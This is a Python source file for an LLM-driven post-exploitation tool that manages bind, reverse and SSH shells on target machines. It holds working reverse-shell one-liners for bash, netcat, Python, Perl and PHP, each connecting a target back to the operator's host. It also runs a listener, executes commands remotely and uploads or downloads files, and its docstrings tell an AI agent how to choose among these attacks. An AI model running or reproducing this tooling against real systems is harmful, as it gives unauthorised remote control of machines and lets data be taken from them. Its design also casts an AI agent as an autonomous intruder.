"""
ShellSessionTool — Persistent interactive shell for post-exploitation.

THREE connection modes — LLM chooses based on the scenario:

  BIND    (we connect TO the target):
    - Target has a port listening (opened by exploit, netcat, etc.)
    - Use when: direct access to target port is possible
    - Workflow: connect → exec/exec_script → close

  REVERSE (target connects TO us — non-blocking listener):
    - We open a local port, target reaches back to us
    - Use when: target is behind NAT, or target firewall blocks inbound
    - Workflow: connect → (get trigger_command) → [run trigger on target]
               → exec/exec_script waits for callback → close

  SSH     (authenticated direct session):
    - Most reliable — survives reboots, reconnects, tool restarts
    - Use when: SSH credentials are known
    - Workflow: connect → exec/exec_script → upload/download → close

Actions:
  connect     — Open connection or start listener; returns session_key
  exec        — Run a single command on an open session
  exec_script — Run multiple commands sequentially
  upload      — Transfer a file to target (SSH only)
  download    — Read a file from target (SSH only)
  close       — Tear down session and free resources
  list        — Show all active sessions

Decision guide (LLM should pick based on available info):
  ┌─────────────────────────────────────────────────────────────────┐
  │ SSH creds in state?             → method=ssh (most reliable)   │
  │ Exploit opened bind shell?      → method=bind                  │
  │   BUT: bind_netcat closes when msfconsole exits!               │
  │   Use post_commands in the exploit call instead.               │
  │ Target behind NAT / egress ok?  → method=reverse               │
  │   1. connect(reverse) → get trigger_command                    │
  │   2. Run trigger_command on target (session_exec / web shell)  │
  │   3. exec() auto-waits for callback                            │
  └─────────────────────────────────────────────────────────────────┘
"""

from __future__ import annotations

import asyncio
import base64
import ipaddress
import logging
import re
import socket
import subprocess
import time
from pathlib import Path
from typing import Any

from tools.base_tool import BaseTool, ToolHealthStatus, ToolMetadata

logger = logging.getLogger(__name__)

_CONNECT_TIMEOUT    = 20      # seconds to connect (bind/ssh)
_REVERSE_WAIT       = 120     # seconds to wait for reverse callback (default)
_CMD_TIMEOUT        = 60      # seconds per command
_RECV_CHUNK         = 4096
_RECV_SETTLE_MS     = 300     # ms silence window after last data chunk
_MAX_OUTPUT_BYTES   = 64 * 1024

# ── Global persistent session store ──────────────────────────────────────────
#
# Each entry keyed by session_key (str).  Possible method values:
#   "ssh"             — active paramiko SSHClient
#   "bind"            — active asyncio StreamReader/Writer
#   "reverse_pending" — listener started, waiting for target callback
#   "reverse"         — callback received, reader/writer populated
#
_SESSIONS: dict[str, dict[str, Any]] = {}


def _auto_key(method: str, host: str, port: int) -> str:
    return f"{method}:{host}:{port}"


def _detect_lhost(target_ip: str) -> str:
    """Pick the local IP that the target can reach back to.

    Priority:
      1. MSF_LHOST_OVERRIDE env var
      2. Interface on the same subnet as target_ip
      3. Socket routing trick fallback
    """
    import os
    override = os.environ.get("MSF_LHOST_OVERRIDE", "").strip()
    if override:
        return override

    try:
        target = ipaddress.ip_address(target_ip)

        def _parse_ip_prefix(text: str) -> list[tuple[str, int]]:
            pairs: list[tuple[str, int]] = []
            for m in re.finditer(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", text):
                pairs.append((m.group(1), int(m.group(2))))
            for m in re.finditer(
                r"inet (\d+\.\d+\.\d+\.\d+)\s+netmask\s+(\S+)", text
            ):
                ip_s, mask_s = m.group(1), m.group(2)
                try:
                    if mask_s.startswith("0x"):
                        prefix = bin(int(mask_s, 16)).count("1")
                    else:
                        prefix = sum(bin(int(o)).count("1") for o in mask_s.split("."))
                    pairs.append((ip_s, prefix))
                except Exception:
                    pass
            return pairs

        cmds = [["ip", "-4", "addr", "show"], ["ifconfig"]]
        for cmd in cmds:
            try:
                r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                if r.returncode != 0:
                    continue
                for ip, prefix in _parse_ip_prefix(r.stdout):
                    if ip.startswith("127."):
                        continue
                    try:
                        net = ipaddress.ip_network(f"{ip}/{prefix}", strict=False)
                        if target in net:
                            return ip
                    except ValueError:
                        continue
            except FileNotFoundError:
                continue
    except Exception:
        pass

    # Routing trick fallback
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target_ip, 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return ""


def _build_trigger_commands(lhost: str, lport: int) -> dict[str, str]:
    """Return a dict of reverse shell one-liners for common interpreters."""
    return {
        "bash":    f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash_196": f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
        "nc_e":    f"nc -e /bin/sh {lhost} {lport}",
        "nc_pipe": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "python3": (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "python2": (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "perl": (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"connect(S,sockaddr_in($p,inet_aton($i)));"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            f"exec(\"/bin/sh -i\");'"
        ),
        "php": (
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
    }


class ShellSessionTool(BaseTool):
    """Persistent, multi-mode shell session manager for post-exploitation."""

    @property
    def metadata(self) -> ToolMetadata:
        return ToolMetadata(
            name="shell_exec",
            description=(
                "Persistent interactive shell for post-exploitation.\n"
                "Three modes — choose based on the situation:\n"
                "\n"
                "  method='bind'    — WE connect to target's port (target listens)\n"
                "                     Use: exploit opened a port, SSH-based tunnels\n"
                "  method='reverse' — TARGET connects to US (we listen)\n"
                "                     Use: target behind NAT, or firewalls block inbound\n"
                "                     connect() returns trigger_commands to run on target\n"
                "                     exec() then waits for the callback automatically\n"
                "  method='ssh'     — Direct SSH session (most reliable)\n"
                "                     Use: when SSH credentials are available in state\n"
                "\n"
                "Actions:\n"
                "  connect     — open/start session → returns session_key\n"
                "  exec        — run one command on open session\n"
                "  exec_script — run multiple commands sequentially\n"
                "  upload      — upload local file to target (SSH only)\n"
                "  download    — read remote file (SSH only)\n"
                "  close       — tear down session\n"
                "  list        — show all active sessions\n"
                "\n"
                "IMPORTANT: session_key comes from action=connect — never invent it.\n"
                "Format is always '{method}:{host}:{port}', e.g. 'ssh:10.0.0.1:22'."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["connect", "exec", "exec_script", "upload",
                                 "download", "close", "list"],
                    },
                    "session_key": {
                        "type": "string",
                        "description": (
                            "Key from action=connect. Required for exec/exec_script/"
                            "upload/download/close."
                        ),
                        "default": "",
                    },
                    "method": {
                        "type": "string",
                        "enum": ["ssh", "bind", "reverse"],
                        "description": "Connection method (required for action=connect)",
                        "default": "bind",
                    },
                    "target_ip": {
                        "type": "string",
                        "description": "Target IP (required for ssh/bind; used for LHOST detection in reverse)",
                        "default": "",
                    },
                    "target_port": {
                        "type": "integer",
                        "description": "Target port (SSH default 22, bind shell default 4444)",
                        "default": 4444,
                    },
                    "local_port": {
                        "type": "integer",
                        "description": "Our local port to listen on (method=reverse only)",
                        "default": 4444,
                    },
                    "reverse_wait": {
                        "type": "integer",
                        "description": "Seconds to wait for reverse callback (default 120)",
                        "default": 120,
                    },
                    "username": {"type": "string", "default": ""},
                    "password": {"type": "string", "default": ""},
                    "private_key": {
                        "type": "string",
                        "description": "PEM private key (method=ssh only)",
                        "default": "",
                    },
                    "command": {
                        "type": "string",
                        "description": "Shell command (action=exec)",
                        "default": "",
                    },
                    "commands": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "Command list (action=exec_script)",
                        "default": [],
                    },
                    "local_path": {
                        "type": "string",
                        "description": "Local file path (action=upload)",
                        "default": "",
                    },
                    "remote_path": {
                        "type": "string",
                        "description": "Remote path for upload/download",
                        "default": "",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Per-command timeout in seconds (default 60)",
                        "default": 60,
                    },
                },
                "required": ["action"],
            },
            category="post-exploit",
            version="3.0.0",
        )

    async def health_check(self) -> ToolHealthStatus:
        try:
            import paramiko  # noqa: F401
            return ToolHealthStatus(
                available=True,
                message="paramiko OK — all methods available (ssh/bind/reverse)",
            )
        except ImportError:
            return ToolHealthStatus(
                available=True,
                degraded=True,
                message="paramiko missing — SSH unavailable; bind/reverse work",
                install_hint="pip install paramiko",
            )

    async def validate(self, params: dict) -> tuple[bool, str]:
        action = params.get("action", "")
        valid = ("connect", "exec", "exec_script", "upload", "download", "close", "list")
        if action not in valid:
            return False, f"Unknown action '{action}'"

        if action == "connect":
            method = params.get("method", "bind")
            if method not in ("ssh", "bind", "reverse"):
                return False, f"Unknown method '{method}'"
            if method in ("ssh", "bind") and not params.get("target_ip", "").strip():
                return False, "target_ip required for ssh/bind"

        elif action in ("exec", "exec_script", "upload", "download", "close"):
            sk = params.get("session_key", "").strip()
            if not sk:
                # Legacy path for exec/exec_script — needs target_ip
                if action not in ("exec", "exec_script"):
                    return False, f"session_key required for {action}"
            if sk:
                if action == "exec" and not params.get("command", "").strip():
                    return False, "command required for action=exec"
                if action == "exec_script" and not params.get("commands"):
                    return False, "commands list required for action=exec_script"
            if action == "upload":
                if not params.get("local_path", "").strip():
                    return False, "local_path required"
                if not params.get("remote_path", "").strip():
                    return False, "remote_path required"
            if action == "download" and not params.get("remote_path", "").strip():
                return False, "remote_path required"

        return True, ""

    # ── Public entry point ────────────────────────────────────────────────────

    async def execute(self, params: dict) -> dict:
        ok, msg = await self.validate(params)
        if not ok:
            return {"success": False, "output": None, "error": msg}

        action  = params.get("action", "")
        timeout = int(params.get("timeout", _CMD_TIMEOUT))

        try:
            if action == "list":
                return self._list_sessions()

            if action == "connect":
                return await self._connect(params)

            if action == "close":
                sk = params.get("session_key", "").strip()
                if not sk:
                    return {"success": False, "output": None,
                            "error": "session_key required"}
                return await self._close(sk)

            sk = params.get("session_key", "").strip()
            if sk:
                return await self._dispatch(sk, action, params, timeout)
            else:
                return await self._legacy(params, action, timeout)

        except Exception as exc:
            logger.error("shell_exec error: %s", exc, exc_info=True)
            return {"success": False, "output": None, "error": str(exc)}

    # ── Session lifecycle ─────────────────────────────────────────────────────

    async def _connect(self, params: dict) -> dict:
        method      = params.get("method", "bind")
        target_ip   = params.get("target_ip", "")
        target_port = int(params.get("target_port", 4444 if method != "ssh" else 22))
        local_port  = int(params.get("local_port", 4444))
        rev_wait    = int(params.get("reverse_wait", _REVERSE_WAIT))

        sk = params.get("session_key", "").strip() or \
             _auto_key(method, target_ip or "local", target_port if method != "reverse" else local_port)

        # Already open → return info without reconnecting
        if sk in _SESSIONS:
            sess = _SESSIONS[sk]
            status = "pending_callback" if sess["method"] == "reverse_pending" else "already_open"
            return {
                "success": True,
                "output": {
                    "session_key": sk,
                    "status": status,
                    "method": sess["method"],
                    "note": "Session already open — reuse this session_key.",
                    **({"trigger_commands": sess.get("trigger_commands", {})}
                       if sess["method"] == "reverse_pending" else {}),
                },
                "error": None,
            }

        if method == "ssh":
            return await asyncio.to_thread(self._connect_ssh, params, sk)
        elif method == "bind":
            return await self._connect_bind(target_ip, target_port, sk)
        else:  # reverse
            return await self._connect_reverse(target_ip, local_port, sk, rev_wait)

    async def _close(self, sk: str) -> dict:
        sess = _SESSIONS.pop(sk, None)
        if sess is None:
            return {"success": False, "output": None,
                    "error": f"No session '{sk}'. Active: {list(_SESSIONS)}"}
        method = sess.get("method", "")
        try:
            if method == "ssh":
                await asyncio.to_thread(sess["client"].close)
            elif method in ("bind", "reverse"):
                w = sess.get("writer")
                if w:
                    w.close()
                    try:
                        await w.wait_closed()
                    except Exception:
                        pass
            elif method == "reverse_pending":
                server = sess.get("server")
                if server:
                    server.close()
        except Exception as exc:
            logger.warning("Error closing %s: %s", sk, exc)
        return {"success": True, "output": {"closed": sk}, "error": None}

    def _list_sessions(self) -> dict:
        now = time.time()
        items = []
        for sk, sess in _SESSIONS.items():
            items.append({
                "session_key":   sk,
                "method":        sess.get("method", "?"),
                "target":        f"{sess.get('target_ip','')}:{sess.get('target_port','')}",
                "age_seconds":   round(now - sess.get("created_at", now)),
                "status":        "pending_callback" if sess.get("method") == "reverse_pending"
                                 else "open",
            })
        return {
            "success": True,
            "output": {"active_sessions": len(items), "sessions": items},
            "error": None,
        }

    # ── Connect backends ──────────────────────────────────────────────────────

    def _connect_ssh(self, params: dict, sk: str) -> dict:
        try:
            import paramiko
        except ImportError:
            return {"success": False, "output": None,
                    "error": "paramiko not installed — use method=bind/reverse instead"}

        target_ip   = params["target_ip"]
        target_port = int(params.get("target_port", 22))
        username    = params.get("username", "")
        password    = params.get("password", "")
        private_key = params.get("private_key", "")

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            kwargs: dict = {
                "hostname": target_ip, "port": target_port,
                "username": username, "timeout": _CONNECT_TIMEOUT,
                "look_for_keys": False, "allow_agent": False,
            }
            if private_key.strip():
                import io
                kwargs["pkey"] = paramiko.RSAKey.from_private_key(io.StringIO(private_key))
            else:
                kwargs["password"] = password
            client.connect(**kwargs)
        except paramiko.AuthenticationException:
            return {"success": False, "output": None,
                    "error": "SSH auth failed — wrong credentials, do NOT retry SSH"}
        except Exception as exc:
            return {"success": False, "output": None, "error": str(exc)}

        _SESSIONS[sk] = {
            "method": "ssh", "client": client,
            "target_ip": target_ip, "target_port": target_port,
            "created_at": time.time(),
        }
        return {
            "success": True,
            "output": {"session_key": sk, "status": "connected", "method": "ssh",
                       "target": f"{target_ip}:{target_port}"},
            "error": None,
        }

    async def _connect_bind(self, target_ip: str, target_port: int, sk: str) -> dict:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(target_ip, target_port),
                timeout=_CONNECT_TIMEOUT,
            )
        except (ConnectionRefusedError, OSError) as exc:
            return {"success": False, "output": None,
                    "error": (
                        f"Cannot connect to bind shell {target_ip}:{target_port} — {exc}. "
                        "Note: cmd/unix/bind_netcat shells close when msfconsole exits. "
                        "If the exploit already completed, the port may be closed. "
                        "Use post_commands in the exploit call instead, or try method=ssh."
                    )}
        except asyncio.TimeoutError:
            return {"success": False, "output": None,
                    "error": f"Timeout connecting to {target_ip}:{target_port}"}

        await asyncio.sleep(0.4)
        banner = await self._drain(reader, settle_ms=200)

        _SESSIONS[sk] = {
            "method": "bind", "reader": reader, "writer": writer,
            "target_ip": target_ip, "target_port": target_port,
            "created_at": time.time(),
        }
        return {
            "success": True,
            "output": {
                "session_key": sk, "status": "connected", "method": "bind",
                "target": f"{target_ip}:{target_port}",
                "banner": banner[:300] or "(no banner)",
                "note": "Session persistent — reuse session_key for all subsequent commands.",
            },
            "error": None,
        }

    async def _connect_reverse(
        self, target_ip: str, local_port: int, sk: str, rev_wait: int
    ) -> dict:
        """Start a non-blocking reverse shell listener.

        Returns immediately with trigger_commands.
        exec()/exec_script() on this session will block until the target
        calls back (up to rev_wait seconds).
        """
        lhost = _detect_lhost(target_ip) if target_ip else ""

        connected = asyncio.Event()
        state: dict[str, Any] = {"reader": None, "writer": None}

        async def _on_connect(r: asyncio.StreamReader, w: asyncio.StreamWriter) -> None:
            if not connected.is_set():   # only take the first connection
                state["reader"] = r
                state["writer"] = w
                connected.set()
                logger.info("[shell_exec] Reverse shell connected from %s",
                            w.get_extra_info("peername", "?"))

        try:
            server = await asyncio.start_server(_on_connect, "0.0.0.0", local_port)
        except OSError as exc:
            return {"success": False, "output": None,
                    "error": f"Cannot bind local port {local_port}: {exc}"}

        triggers = _build_trigger_commands(lhost, local_port) if lhost else {}

        _SESSIONS[sk] = {
            "method": "reverse_pending",
            "server": server,
            "connected": connected,
            "state": state,
            "lhost": lhost,
            "local_port": local_port,
            "target_ip": target_ip,
            "target_port": local_port,
            "rev_wait": rev_wait,
            "trigger_commands": triggers,
            "created_at": time.time(),
        }

        logger.info("[shell_exec] Reverse listener on 0.0.0.0:%d — waiting for callback",
                    local_port)
        return {
            "success": True,
            "output": {
                "session_key": sk,
                "status": "listening",
                "method": "reverse",
                "lhost": lhost,
                "local_port": local_port,
                "wait_seconds": rev_wait,
                "trigger_commands": triggers,
                "next_step": (
                    f"Run one of the trigger_commands on the TARGET to make it "
                    f"connect back to {lhost}:{local_port}. "
                    f"Then call shell_exec(action=exec, session_key='{sk}', command='id') — "
                    f"it will wait up to {rev_wait}s for the callback."
                ),
            },
            "error": None,
        }

    # ── Dispatch on existing session ──────────────────────────────────────────

    async def _dispatch(self, sk: str, action: str, params: dict, timeout: int) -> dict:
        sess = _SESSIONS.get(sk)
        if sess is None:
            return {
                "success": False, "output": None,
                "error": (
                    f"Session '{sk}' not found. Active: {list(_SESSIONS)}. "
                    "Call action=connect first."
                ),
            }

        method = sess["method"]

        # ── Reverse pending: wait for callback before executing ───────────────
        if method == "reverse_pending":
            return await self._wait_and_dispatch(sk, sess, action, params, timeout)

        if method == "ssh":
            return await asyncio.to_thread(
                self._ssh_dispatch, sess["client"], action, params, timeout
            )

        if method in ("bind", "reverse"):
            return await self._raw_dispatch(
                sess["reader"], sess["writer"], action, params, timeout
            )

        return {"success": False, "output": None,
                "error": f"Unknown session method '{method}'"}

    async def _wait_and_dispatch(
        self, sk: str, sess: dict, action: str, params: dict, timeout: int
    ) -> dict:
        """Block until reverse shell callback arrives, then execute."""
        rev_wait: int  = sess.get("rev_wait", _REVERSE_WAIT)
        connected: asyncio.Event = sess["connected"]

        logger.info("[shell_exec] Waiting up to %ds for reverse callback on port %d …",
                    rev_wait, sess["local_port"])
        try:
            await asyncio.wait_for(connected.wait(), timeout=rev_wait)
        except asyncio.TimeoutError:
            # Clean up
            server = sess.get("server")
            if server:
                server.close()
            _SESSIONS.pop(sk, None)
            return {
                "success": False, "output": None,
                "error": (
                    f"Reverse shell timeout: no callback on port {sess['local_port']} "
                    f"within {rev_wait}s. Ensure trigger_command ran on target "
                    f"and {sess.get('lhost','<lhost>')}:{sess['local_port']} is reachable."
                ),
            }

        # Upgrade session to live reverse
        state = sess["state"]
        reader: asyncio.StreamReader = state["reader"]
        writer: asyncio.StreamWriter = state["writer"]
        server = sess.get("server")
        if server:
            server.close()  # stop accepting new connections

        # Brief drain for initial banner
        await asyncio.sleep(0.3)
        banner = await self._drain(reader, settle_ms=200)

        _SESSIONS[sk] = {
            "method": "reverse", "reader": reader, "writer": writer,
            "target_ip": sess.get("target_ip", ""), "target_port": sess.get("local_port", 0),
            "created_at": sess["created_at"],
        }
        logger.info("[shell_exec] Reverse shell active: %s", sk)

        # Execute the command immediately
        result = await self._raw_dispatch(reader, writer, action, params, timeout)
        if result.get("output") and banner:
            result["output"]["banner"] = banner[:200]
        return result

    # ── SSH helpers ───────────────────────────────────────────────────────────

    def _ssh_dispatch(self, client, action: str, params: dict, timeout: int) -> dict:
        if action == "exec":
            return self._ssh_exec(client, params["command"], timeout)
        if action == "exec_script":
            return self._ssh_exec_script(client, params.get("commands", []), timeout)
        if action == "upload":
            return self._ssh_upload(client, params["local_path"],
                                    params["remote_path"], timeout)
        if action == "download":
            return self._ssh_download(client, params["remote_path"], timeout)
        return {"success": False, "output": None,
                "error": f"action={action} not supported via SSH"}

    def _ssh_run(self, client, cmd: str, timeout: int) -> tuple[str, str, int]:
        _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
        out = stdout.read().decode(errors="replace")
        err = stderr.read().decode(errors="replace")
        rc  = stdout.channel.recv_exit_status()
        return out, err, rc

    def _ssh_exec(self, client, cmd: str, timeout: int) -> dict:
        out, err, rc = self._ssh_run(client, cmd, timeout)
        return {
            "success": rc == 0,
            "output": {"command": cmd, "stdout": out, "stderr": err, "exit_code": rc},
            "error": err if rc != 0 else None,
        }

    def _ssh_exec_script(self, client, commands: list[str], timeout: int) -> dict:
        results, combined_out, combined_err = [], [], []
        for cmd in commands:
            out, err, rc = self._ssh_run(client, cmd, timeout)
            combined_out.append(f"$ {cmd}\n{out}")
            if err.strip():
                combined_err.append(f"[stderr] {err}")
            results.append({"command": cmd, "stdout": out, "stderr": err, "exit_code": rc})
        return {
            "success": True,
            "output": {
                "commands_run": len(results),
                "results": results,
                "combined_stdout": "\n".join(combined_out)[:_MAX_OUTPUT_BYTES],
                "combined_stderr": "\n".join(combined_err)[:4096],
            },
            "error": None,
        }

    def _ssh_upload(self, client, local_path: str, remote_path: str, timeout: int) -> dict:
        try:
            data = Path(local_path).read_bytes()
        except Exception as exc:
            return {"success": False, "output": None,
                    "error": f"Cannot read local file: {exc}"}
        enc = base64.b64encode(data).decode()
        lines = [enc[i:i+76] for i in range(0, len(enc), 76)]
        cmd = f"printf '%s' '{chr(10).join(lines)}' | base64 -d > {remote_path} && echo OK"
        out, err, rc = self._ssh_run(client, cmd, timeout)
        return {
            "success": rc == 0 and "OK" in out,
            "output": {"bytes": len(data), "remote_path": remote_path},
            "error": err if rc != 0 else None,
        }

    def _ssh_download(self, client, remote_path: str, timeout: int) -> dict:
        out, err, rc = self._ssh_run(client, f"cat {remote_path} | base64", timeout)
        if rc != 0:
            return {"success": False, "output": None, "error": err or "cat failed"}
        try:
            decoded = base64.b64decode(out.strip())
            return {
                "success": True,
                "output": {
                    "remote_path": remote_path,
                    "bytes": len(decoded),
                    "content_preview": decoded[:2048].decode(errors="replace"),
                    "content_base64": out.strip()[:8192],
                },
                "error": None,
            }
        except Exception as exc:
            return {"success": False, "output": None, "error": f"base64 decode: {exc}"}

    # ── Raw TCP helpers (bind + reverse) ──────────────────────────────────────

    async def _raw_dispatch(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        action: str,
        params: dict,
        timeout: int,
    ) -> dict:
        if action == "exec":
            return await self._raw_exec(reader, writer, params["command"], timeout)
        if action == "exec_script":
            return await self._raw_exec_script(reader, writer,
                                               params.get("commands", []), timeout)
        return {"success": False, "output": None,
                "error": f"action={action} not supported for raw shell (use exec/exec_script)"}

    async def _raw_exec(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        command: str,
        timeout: int,
    ) -> dict:
        writer.write((command + "\n").encode())
        await writer.drain()
        try:
            output = await asyncio.wait_for(self._drain(reader), timeout=timeout)
        except asyncio.TimeoutError:
            output = "[TIMEOUT — command may still be running]"
        return {
            "success": True,
            "output": {"command": command, "stdout": output[:_MAX_OUTPUT_BYTES]},
            "error": None,
        }

    async def _raw_exec_script(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        commands: list[str],
        timeout: int,
    ) -> dict:
        results, combined = [], []
        for cmd in commands:
            writer.write((cmd + "\n").encode())
            await writer.drain()
            try:
                out = await asyncio.wait_for(self._drain(reader), timeout=timeout)
            except asyncio.TimeoutError:
                out = "[TIMEOUT]"
            results.append({"command": cmd, "stdout": out[:_MAX_OUTPUT_BYTES]})
            combined.append(f"$ {cmd}\n{out}")
        return {
            "success": True,
            "output": {
                "commands_run": len(results),
                "results": results,
                "combined_stdout": "\n".join(combined)[:_MAX_OUTPUT_BYTES],
            },
            "error": None,
        }

    async def _drain(self, reader: asyncio.StreamReader,
                     settle_ms: int = _RECV_SETTLE_MS) -> str:
        chunks, total = [], 0
        while total < _MAX_OUTPUT_BYTES:
            try:
                chunk = await asyncio.wait_for(
                    reader.read(_RECV_CHUNK), timeout=settle_ms / 1000.0
                )
                if not chunk:
                    break
                chunks.append(chunk)
                total += len(chunk)
            except asyncio.TimeoutError:
                break
        return b"".join(chunks).decode(errors="replace")

    # ── Legacy single-use path (backward compat, no session_key) ─────────────

    async def _legacy(self, params: dict, action: str, timeout: int) -> dict:
        method = params.get("method", "ssh")
        target_ip   = params.get("target_ip", "")
        target_port = int(params.get("target_port", 22 if method == "ssh" else 4444))

        if method == "ssh":
            return await asyncio.to_thread(self._legacy_ssh, params, action, timeout)

        if method == "bind":
            try:
                r, w = await asyncio.wait_for(
                    asyncio.open_connection(target_ip, target_port),
                    timeout=_CONNECT_TIMEOUT,
                )
            except Exception as exc:
                return {"success": False, "output": None, "error": str(exc)}
            try:
                await asyncio.sleep(0.3)
                await self._drain(r, settle_ms=150)
                if action == "exec":
                    return await self._raw_exec(r, w, params.get("command", ""), timeout)
                return await self._raw_exec_script(r, w, params.get("commands", []), timeout)
            finally:
                try:
                    w.close()
                    await w.wait_closed()
                except Exception:
                    pass

        return {"success": False, "output": None,
                "error": "method=reverse requires action=connect first to get session_key"}

    def _legacy_ssh(self, params: dict, action: str, timeout: int) -> dict:
        try:
            import paramiko
        except ImportError:
            return {"success": False, "output": None, "error": "paramiko not installed"}
        target_ip   = params.get("target_ip", "")
        target_port = int(params.get("target_port", 22))
        username    = params.get("username", "")
        password    = params.get("password", "")
        private_key = params.get("private_key", "")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            kwargs: dict = {
                "hostname": target_ip, "port": target_port,
                "username": username, "timeout": _CONNECT_TIMEOUT,
                "look_for_keys": False, "allow_agent": False,
            }
            if private_key.strip():
                import io
                kwargs["pkey"] = paramiko.RSAKey.from_private_key(io.StringIO(private_key))
            else:
                kwargs["password"] = password
            client.connect(**kwargs)
            if action == "exec":
                return self._ssh_exec(client, params.get("command", ""), timeout)
            if action == "exec_script":
                return self._ssh_exec_script(client, params.get("commands", []), timeout)
            if action == "upload":
                return self._ssh_upload(client, params["local_path"],
                                        params["remote_path"], timeout)
            if action == "download":
                return self._ssh_download(client, params["remote_path"], timeout)
            return {"success": False, "output": None, "error": f"Unknown action: {action}"}
        except paramiko.AuthenticationException:
            return {"success": False, "output": None,
                    "error": "SSH auth failed — wrong credentials, do NOT retry SSH"}
        except Exception as exc:
            return {"success": False, "output": None, "error": str(exc)}
        finally:
            client.close()
